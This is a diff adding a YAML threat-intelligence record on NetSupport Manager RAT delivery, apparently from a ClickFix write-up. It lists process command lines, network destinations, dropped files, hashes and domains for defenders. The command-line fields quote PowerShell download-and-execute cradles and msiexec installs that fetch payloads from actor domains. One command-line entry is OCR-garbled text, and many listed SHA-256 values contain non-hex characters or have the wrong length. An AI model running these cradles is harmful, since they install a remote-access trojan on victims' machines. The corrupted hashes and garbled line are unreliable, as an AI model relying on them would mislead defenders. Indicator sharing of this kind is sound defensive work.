@@ -1,0 +1,114 @@
+description: NetSupport Manager RAT distributed via PowerShell loaders and MSI installers.
+attribution: Unknown state-sponsored threat actor
+malware_families:
+- NetSupport Manager
+- NetSupport Manager RAT
+TTPs:
+  processes:
+  - PowerShell.exe
+  - msiexec.exe
+  - client32.exe
+  commandline:
+  - PowerShell.exe -w h -nop -ep Bypass -c "$S='hxxps://riverlino[.]com/U.GRE';$j=$env:TEMP+'\1.ps1';(New-Object
+    Net.WebClient).DownloadFile($S,$j);powershell -f $j"
+  - PowerShell.exe -w h -nop -c "&('iex') (New-Object IO.StreamReader([Net.WebRequest]::Create('https://xunira[.]cloud/C[.]GRE').GetResponse().GetResponseStream())).ReadToEnd()"
+  - msiexec.exe /i hxxps://global-weekends[.]net/res/helprecord /qn ba5ceb26=2bbb8402(f346c24d*e4bc04ef(8623a414_fad334a0
+  - msiexec.exe /i hxxps://stradomi[.]com/res/presentjudge /qn 84e58207=a84823e3_c3ef427e(29bf9dc6%d30821f6*65bca359)9136c3b0*d438d401%fc61d016
+  - powershell.exe -enc JABsAGwAPQBAACgAMgAyADMALAAyACwAMgAyADYALAAyAD
+  - ttp-client/1.$xL=$06. geTSTRIngASynC ' https://ipvinp.con/solid.vmx') .Result;$xL|&('78031qinxRnEXEmAUr
+    ' [6,11,12] ~JoIN ''JwAdd-tpe 'using System;using Systen.Runtine. InteropServices;public
+    class us{[D1lInport(user32") Ipublic static extern bool Showlindow(IntPtr-h,int
+    n);[DULInport ("kernel32") Ipublic static extern IntPtr GetConsoleWindow();% python3
+    NetSupport_PowerShell Unpacker.py 6755399463000003/a823031ba67d0e5f7ef16d63fe93a05ed00:.|1
+    {1 |s T L]= Ty |i( i !Unpack NetSupport Manager RAT PowerShell loader.
+  powershell:
+  - $S='hxxps://riverlino[.]com/U.GRE';$j=$env:TEMP+'\1.ps1';(New-Object Net.WebClient).DownloadFile($S,$j);powershell
+    -f $j
+  - '&(''iex'') (New-Object IO.StreamReader([Net.WebRequest]::Create(''https://xunira[.]cloud/C[.]GRE'').GetResponse().GetResponseStream())).ReadToEnd()'
+  - NetSupport_PowerShell
+  scripting_engine:
+  - python3 NetSupport_PowerShell Unpacker.py
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: PowerShell.exe
+    destination: hxxps://riverlino[.]com
+    port: ''
+  - executable: PowerShell.exe
+    destination: https://xunira[.]cloud
+    port: ''
+  - executable: msiexec.exe
+    destination: hxxps://global-weekends[.]net
+    port: ''
+  - executable: msiexec.exe
+    destination: hxxps://stradomi[.]com
+    port: ''
+  - executable: ''
+    destination: https://ipvinp.con/solid.vmx
+    port: ''
+  file_activity:
+  - C:\\Users\\Public\\No6pvpCzGIf\\client32.exe
+  - C:\\Users\\Public\\No6pvpCzGIf\\client32.ini
+  - C:\\Users\\Public\\No6pvpCzGIf\\HTCTL32.DLL
+  - C:\\Users\\Public\\No6pvpCzGIf\\nsvcr1e8.dll
+  - C:\\Users\\Public\\No6pvpCzGIf\\nskbfltr.inf
+  - C:\\Users\\Public\\No6pvpCzGIf\\NSM.ini
+  - C:\\Users\\Public\\No6pvpCzGIf\\NSM. LIC
+  - path: 48cb4fe8-4ff2-4bcd-9573-61a9af2658ad/client32.exe
+    sha256: 318B4cABf9294c9fa7c165c890487brbebedasdaf3244ad38b93122b933c79
+  - path: 48cb4fe8-4ff2-4bcd-9573-61a9af2658ad/client32.ini
+    sha256: 41681a36fB6dBCr19f4dd6016ad9190a58b75bbb14aBAf554f354a80389bdd77
+  - path: 48cb4fe8-4ff2-4bcd-9573-61a9af2658ad/HTCTL32.DLL
+    sha256: edfe2b923bfb5d1088de1611481f5c35ece9158107153a5631647ack17d796
+  - path: 48cb4fe8-4ff2-4bcd-9573-61a9af2658ad/nsvcr1e8.dll
+    sha256: B793353461826fbd4Br250aBbB35be204b758ce7510db2af631b28850355bd1E
+  - path: 48cb4fe8-4ff2-4bcd-9573-61a9af2658ad/nskbfltr.inf
+    sha256: d96856cd944a9f1587987cacef974ca248b74216f1689c1ebbcackfed289368
+  - path: 48cb4fe8-4ff2-4bcd-9573-61a9af2658ad/NSM.ini
+    sha256: 68fe386112ad51f4Balee9elbl5ecaBb2ced174d7855341c491deeB6788b392
+  - path: 48cb4fe8-4ff2-4bcd-9573-61a9af2658ad/NSM. LIC
+    sha256: ad8d85385fdeb3736c1e8d49c3a6746873d27b4783ebbdes5B9bdckaa72d7b54
+  - path: 48cb4fe8-4ff2-4bcd-9573-61a9af2658ad/peicapi.dll
+    sha256: 9874fd4BeasaBcaaB92es361a6akeB34c2e5106098d1fFcda7a9253759426917
+  - path: 48cb4fe8-4ff2-4bcd-9573-61a9af2658ad/PCICHEK.DLL
+    sha256: 313117e723dda6ead911faacd23f4485083b651c73deBdeff18b9ebbb4asEBa
+  - path: 48cb4fe8-4ff2-4bcd-9573-61a9af2658ad/PCICL32.DLL
+    sha256: 63aalBc32af714415607e02d5baBfasf5872a7deb56894T696585ChCoafesrs
+  - path: 48cb4fe8-4ff2-4bcd-9573-61a9af2658ad/rencndstub.exe
+    sha256: 6558b3387215c4b73fc96dc552213427fb9b2BcBCb2B2fe6c38I24f1068087d6
+  - path: 48cb4fe8-4ff2-4bcd-9573-61a9af2658ad/TCCTL32.DLL
+    sha256: 6795d768ce7a955df6c258622961280dbBC9BBIBBeAakT666926988447eaDone.dfd19afc7d2fed60f20e651a8bb.ps1.
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes:
+  - a823031ba57d0e5f7ef15d63fe93a05ed00eadfd19afc7d2fed60f20e651a8bb
+  - 37d1d033e19cf9dc7313846d9d4026b03d2f822efccd963e5697e9633a4df0d0
+  - d5b13eb9e8afb79b4d7830caf3ac746637e5bda1752962e5bd0aed3352cc4a42
+  - f81220b94384e98203d230fe6a386b6047157474d16f7e75e0f4ffb6d8bdcde3
+  - 94c2f209e5710fe5b2d2c6ac8ab6060db67627331ca11c1394fbded2875d039f
+  - f3f44fd37502cd4b16bca3c3fb1e88a687bd2980926017b0ff1752dc601d4c1e
+  - 318B4cABf9294c9fa7c165c890487brbebedasdaf3244ad38b93122b933c79
+  - 41681a36fB6dBCr19f4dd6016ad9190a58b75bbb14aBAf554f354a80389bdd77
+  - edfe2b923bfb5d1088de1611481f5c35ece9158107153a5631647ack17d796
+  - B793353461826fbd4Br250aBbB35be204b758ce7510db2af631b28850355bd1E
+  - d96856cd944a9f1587987cacef974ca248b7 4216f1689c1ebbcackfed289368
+  - 68fe386112ad51f4Balee9elbl5ecaBb2ced174d7855341c491deeB6788b392
+  - ad8d85385fdeb3736c1e8d49c3a6746873d27b4783ebbdes5B9bdckaa72d7b54
+  - d96856cd944a9f1587987cacef974ca248b74216f1689c1ebbcackfed289368
+  - 9874fd4BeasaBcaaB92es361a6akeB34c2e5106098d1fFcda7a9253759426917
+  - 313117e723dda6ead911faacd23f4485083b651c73deBdeff18b9ebbb4asEBa
+  - 63aalBc32af714415607e02d5baBfasf5872a7deb56894T696585ChCoafesrs
+  - 6558b3387215c4b73fc96dc552213427fb9b2BcBCb2B2fe6c38I24f1068087d6
+  - 6795d768ce7a955df6c258622961280dbBC9BBIBBeAakT666926988447eaDone.dfd19afc7d2fed60f20e651a8bb.ps1.
+  domains:
+  - riverlino[.]com
+  - xunira[.]cloud
+  - global-weekends[.]net
+  - stradomi[.]com
+  - ipvinp.con
+  urls:
+  - https://ipvinp.con/solid.vmx
+reference: https://www.esentire.com/blog/unpacking-netsupport-rat-loaders-delivered-via-clickfix
+date_of_publication: October 25, 2025
+file_creation_date: October 25, 2025
